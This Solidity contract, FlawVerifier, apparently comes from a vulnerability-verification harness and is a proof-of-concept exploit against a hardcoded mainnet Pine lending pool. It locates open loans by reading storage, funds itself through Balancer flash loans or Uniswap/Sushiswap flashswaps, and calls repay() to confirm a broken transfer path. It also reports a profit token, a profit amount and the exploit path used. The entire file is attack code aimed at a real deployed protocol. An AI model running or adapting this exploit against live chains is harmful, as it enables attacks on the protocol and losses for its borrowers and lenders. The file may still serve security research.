pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPinePool {
    function _supportedCurrency() external view returns (address);
    function _fundSource() external view returns (address);
    function _controlPlane() external view returns (address);
    function paused() external view returns (bool);

    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);

    function _loans(
        uint256 nftID
    )
        external
        view
        returns (
            uint256 loanStartBlock,
            uint256 loanExpireTimestamp,
            uint32 interestBPS1000000XBlock,
            uint32 maxLTVBPS,
            uint256 borrowedWei,
            uint256 returnedWei,
            uint256 accuredInterestWei,
            uint256 repaidInterestWei,
            address borrower
        );
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3SwapRouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVmLike {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    struct LoanTermsView {
        uint256 borrowedWei;
        uint256 returnedWei;
        address borrower;
    }

    struct V2FundingPlan {
        address pair;
        address repaymentToken;
        uint24 routerFee;
        uint256 borrowAmount;
        uint256 requiredRepaymentAmount;
    }

    uint256 private constant MIN_REPAY_AMOUNT = 1;
    uint256 private constant MAX_LOAN_SCAN_EXCLUSIVE = 10_000;
    uint256 private constant V2_FLASH_BORROW_AMOUNT = 1e15;

    address private constant TARGET_POOL = 0x2405913d54fC46eEAF3Fb092BfB099F46803872f;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    uint256 private constant STORAGE_SLOT_CONTROL_PLANE = 203;
    uint256 private constant STORAGE_SLOT_FUND_SOURCE = 204;
    uint256 private constant STORAGE_SLOT_SUPPORTED_CURRENCY = 205;
    uint256 private constant STORAGE_SLOT_LOANS = 212;

    bytes32 private constant CALLBACK_MODE_BALANCER = keccak256("balancer_flash_loan_probe");
    bytes32 private constant CALLBACK_MODE_UNIV2 = keccak256("univ2_flashswap_probe");

    IPinePool private immutable POOL;
    IERC20Like private immutable SUPPORTED_CURRENCY_TOKEN;
    address private immutable SUPPORTED_CURRENCY;
    address private immutable FUND_SOURCE;
    address private immutable CONTROL_PLANE;

    IVmLike private constant VM = IVmLike(HEVM_ADDRESS);

    uint256 public candidateLoanId;
    uint256 public candidateOutstandingPrincipalWei;
    bool public candidateLocated;
    bool public usedDirectBalance;
    bool public usedExternalFlashswap;
    bool public storageLayoutVerified;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public selfTransferFromWithoutAllowanceWorks;
    bool private selfTransferProbeAttempted;

    uint8 public lastFailureCode;
    bytes public lastRevertData;
    uint256 public observedPoolSelfAllowance;

    constructor() {
        POOL = IPinePool(TARGET_POOL);
        SUPPORTED_CURRENCY = POOL._supportedCurrency();
        FUND_SOURCE = POOL._fundSource();
        CONTROL_PLANE = POOL._controlPlane();
        SUPPORTED_CURRENCY_TOKEN = IERC20Like(SUPPORTED_CURRENCY);
    }

    function executeOnOpportunity() external {
        if (POOL.paused()) {
            lastFailureCode = 8;
            return;
        }

        storageLayoutVerified = _verifyStaticStorageAnchors();

        if (!candidateLocated) {
            _locateCandidateLoan();
        }

        if (!candidateLocated) {
            lastFailureCode = 1;
            return;
        }

        if (SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= MIN_REPAY_AMOUNT) {
            usedDirectBalance = true;
            _evaluateRepayPathWithFundedProbe();
            if (hypothesisValidated || hypothesisRefuted) {
                return;
            }
        }

        // Prefer a v2-style flashswap funding attempt. If the deterministic repayment leg
        // is not available on this fork, fall back to Balancer's public zero-fee flash loan
        // solely to fund the caller-side `transferFrom(msg.sender, address(this), repayAmount)`
        // with a real nonzero amount for the repay-path probe.
        usedExternalFlashswap = true;
        if (_tryUniswapV2FlashswapFunding()) {
            if (hypothesisValidated || hypothesisRefuted) {
                return;
            }
        }

        _borrowTemporarilyWithBalancerAndAttemptRepay(MIN_REPAY_AMOUNT);

        if (!hypothesisValidated && !hypothesisRefuted) {
            lastFailureCode = 9;
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "unexpected lender");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected loan");
        require(address(tokens[0]) == SUPPORTED_CURRENCY, "unexpected token");
        require(abi.decode(userData, (bytes32)) == CALLBACK_MODE_BALANCER, "unexpected mode");
        require(amounts[0] >= MIN_REPAY_AMOUNT, "insufficient loan");
        require(feeAmounts[0] == 0, "unexpected flash fee");

        if (!hypothesisValidated && !hypothesisRefuted) {
            _evaluateRepayPathWithFundedProbe();
        }

        require(SUPPORTED_CURRENCY_TOKEN.transfer(BALANCER_VAULT, amounts[0]), "vault repayment failed");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0 || amount1 == 0, "unexpected amounts");

        (bytes32 mode, V2FundingPlan memory plan) = abi.decode(data, (bytes32, V2FundingPlan));
        require(mode == CALLBACK_MODE_UNIV2, "unexpected mode");
        require(msg.sender == plan.pair, "unexpected pair");

        if (!hypothesisValidated && !hypothesisRefuted) {
            _evaluateRepayPathWithFundedProbe();
        }

        uint256 supportedBalance = SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this));
        require(supportedBalance >= MIN_REPAY_AMOUNT, "missing probe funds");

        _forceApprove(SUPPORTED_CURRENCY_TOKEN, UNISWAP_V3_ROUTER, 0);
        _forceApprove(SUPPORTED_CURRENCY_TOKEN, UNISWAP_V3_ROUTER, supportedBalance);

        uint256 amountOut = IUniswapV3SwapRouterLike(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3SwapRouterLike.ExactInputSingleParams({
                tokenIn: SUPPORTED_CURRENCY,
                tokenOut: plan.repaymentToken,
                fee: plan.routerFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: supportedBalance,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        require(amountOut >= plan.requiredRepaymentAmount, "v2 repayment route unavailable");
        require(IERC20Like(plan.repaymentToken).transfer(plan.pair, plan.requiredRepaymentAmount), "pair repayment failed");
    }

    function profitToken() external view returns (address) {
        return SUPPORTED_CURRENCY;
    }

    function profitAmount() external view returns (uint256) {
        return SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this));
    }

    function exploitPathUsed() external view returns (string memory) {
        if (hypothesisValidated) {
            return
                "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
        }

        if (hypothesisRefuted && selfTransferFromWithoutAllowanceWorks) {
            return
                "repay(nftID, repayAmount, pineWallet) is infeasible at this fork block because the live supported currency permits nonzero self-sourced transferFrom(address(this), ...) without a self-allowance";
        }

        if (hypothesisRefuted && observedPoolSelfAllowance > 0) {
            return
                "repay(nftID, repayAmount, pineWallet) is infeasible at this fork block because the pool already has a nonzero self-allowance";
        }

        return
            "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
    }

    function pathAnchors() external pure returns (string memory) {
        return
            "repay(nftID, repayAmount, pineWallet); transferFrom(msg.sender, address(this), repayAmount); transferFrom(address(this), _fundSource, ...); transferFrom(address(this), _controlPlane, ...)";
    }

    function expectedBrokenFlow() external view returns (address, address, address) {
        return (SUPPORTED_CURRENCY, FUND_SOURCE, CONTROL_PLANE);
    }

    function targetPool() external pure returns (address) {
        return TARGET_POOL;
    }

    function _borrowTemporarilyWithBalancerAndAttemptRepay(uint256 amount) internal {
        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = SUPPORTED_CURRENCY_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, abi.encode(CALLBACK_MODE_BALANCER)) {
            return;
        } catch (bytes memory reason) {
            lastRevertData = reason;
            lastFailureCode = 10;
        }
    }

    function _tryUniswapV2FlashswapFunding() internal returns (bool) {
        if (SUPPORTED_CURRENCY != WETH) {
            return false;
        }

        V2FundingPlan memory plan = _buildWethFlashswapPlan(UNISWAP_V2_FACTORY);
        if (plan.pair == address(0)) {
            plan = _buildWethFlashswapPlan(SUSHISWAP_FACTORY);
        }

        if (plan.pair == address(0)) {
            return false;
        }

        try IUniswapV2PairLike(plan.pair).swap(
            _pairTokenIsToken0(plan.pair, SUPPORTED_CURRENCY) ? plan.borrowAmount : 0,
            _pairTokenIsToken0(plan.pair, SUPPORTED_CURRENCY) ? 0 : plan.borrowAmount,
            address(this),
            abi.encode(CALLBACK_MODE_UNIV2, plan)
        ) {
            return true;
        } catch (bytes memory reason) {
            lastRevertData = reason;
            lastFailureCode = 11;
            return false;
        }
    }

    function _buildWethFlashswapPlan(address factory) internal view returns (V2FundingPlan memory plan) {
        address pair = IUniswapV2FactoryLike(factory).getPair(WETH, USDC);
        if (pair == address(0)) {
            return plan;
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        bool wethIsToken0 = _pairTokenIsToken0(pair, WETH);
        uint256 reserveOut = wethIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveIn = wethIsToken0 ? uint256(reserve1) : uint256(reserve0);
        if (reserveOut <= V2_FLASH_BORROW_AMOUNT || reserveIn == 0) {
            return plan;
        }

        plan.pair = pair;
        plan.repaymentToken = USDC;
        plan.routerFee = 500;
        plan.borrowAmount = V2_FLASH_BORROW_AMOUNT;
        plan.requiredRepaymentAmount = _getAmountIn(V2_FLASH_BORROW_AMOUNT, reserveIn, reserveOut);
    }

    function _evaluateRepayPathWithFundedProbe() internal {
        _probeSelfTransferFromSemantics(MIN_REPAY_AMOUNT);
        observedPoolSelfAllowance = SUPPORTED_CURRENCY_TOKEN.allowance(TARGET_POOL, TARGET_POOL);

        if (selfTransferFromWithoutAllowanceWorks) {
            hypothesisRefuted = true;
            lastFailureCode = 3;
            return;
        }

        if (observedPoolSelfAllowance > 0) {
            hypothesisRefuted = true;
            lastFailureCode = 5;
            return;
        }

        _attemptRepay(candidateLoanId, MIN_REPAY_AMOUNT);
    }

    function _locateCandidateLoan() internal {
        uint256 bestGap;

        if (storageLayoutVerified) {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromStorage(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        } else {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromGetter(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        }

        if (candidateLocated) {
            lastFailureCode = 0;
            delete lastRevertData;
        }
    }

    function _attemptRepay(uint256 nftID, uint256 repayAmount) internal {
        _forceApprove(SUPPORTED_CURRENCY_TOKEN, TARGET_POOL, 0);
        _forceApprove(SUPPORTED_CURRENCY_TOKEN, TARGET_POOL, repayAmount);

        try POOL.repay(nftID, repayAmount, address(0)) returns (bool ok) {
            if (ok) {
                hypothesisRefuted = true;
                lastFailureCode = 2;
            } else {
                lastFailureCode = 7;
            }
        } catch (bytes memory reason) {
            lastRevertData = reason;

            bytes32 reasonHash = keccak256(bytes(_decodeRevertString(reason)));
            if (
                reasonHash == keccak256(bytes("fund transfer unsuccessful (payload)")) ||
                reasonHash == keccak256(bytes("fund transfer unsuccessful (fee)"))
            ) {
                hypothesisValidated = true;
                lastFailureCode = 4;
                return;
            }

            if (selfTransferFromWithoutAllowanceWorks) {
                hypothesisRefuted = true;
                lastFailureCode = 3;
                return;
            }

            if (observedPoolSelfAllowance > 0) {
                hypothesisRefuted = true;
                lastFailureCode = 5;
                return;
            }

            lastFailureCode = 7;
        }
    }

    function _probeSelfTransferFromSemantics(uint256 amount) internal {
        if (selfTransferProbeAttempted) {
            return;
        }
        selfTransferProbeAttempted = true;

        require(amount > 0, "probe amount zero");
        require(SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= amount, "probe requires funds");

        (bool ok, bytes memory ret) = SUPPORTED_CURRENCY.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, address(this), address(this), amount)
        );

        if (!ok) {
            return;
        }

        if (ret.length == 0) {
            selfTransferFromWithoutAllowanceWorks = true;
            return;
        }

        if (ret.length >= 32 && abi.decode(ret, (bool))) {
            selfTransferFromWithoutAllowanceWorks = true;
        }
    }

    function _verifyStaticStorageAnchors() internal view returns (bool) {
        return
            _slotAddress(STORAGE_SLOT_CONTROL_PLANE) == CONTROL_PLANE &&
            _slotAddress(STORAGE_SLOT_FUND_SOURCE) == FUND_SOURCE &&
            _slotAddress(STORAGE_SLOT_SUPPORTED_CURRENCY) == SUPPORTED_CURRENCY;
    }

    function _loanTermsFromGetter(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        (
            ,
            ,
            ,
            ,
            uint256 borrowedWei,
            uint256 returnedWei,
            ,
            ,
            address borrower
        ) = POOL._loans(nftID);

        loan.borrowedWei = borrowedWei;
        loan.returnedWei = returnedWei;
        loan.borrower = borrower;
    }

    function _loanTermsFromStorage(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        uint256 base = uint256(keccak256(abi.encode(nftID, STORAGE_SLOT_LOANS)));
        loan.borrowedWei = _slotUint(base + 3);
        loan.returnedWei = _slotUint(base + 4);
        loan.borrower = _slotAddress(base + 7);
    }

    function _principalGap(uint256 borrowedWei, uint256 returnedWei) internal pure returns (uint256) {
        if (borrowedWei <= returnedWei) {
            return 0;
        }
        return borrowedWei - returnedWei;
    }

    function _slotUint(uint256 slot) internal view returns (uint256) {
        return uint256(VM.load(TARGET_POOL, bytes32(slot)));
    }

    function _slotAddress(uint256 slot) internal view returns (address) {
        return address(uint160(uint256(VM.load(TARGET_POOL, bytes32(slot)))));
    }

    function _pairTokenIsToken0(address pair, address token) internal view returns (bool) {
        return IUniswapV2PairLike(pair).token0() == token;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "insufficient output");
        require(reserveIn > 0 && reserveOut > amountOut, "insufficient liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        require(token.approve(spender, amount), "approve failed");
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector != 0x08c379a0) {
            return "";
        }

        bytes memory sliced = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            sliced[i - 4] = revertData[i];
        }

        return abi.decode(sliced, (string));
    }
}
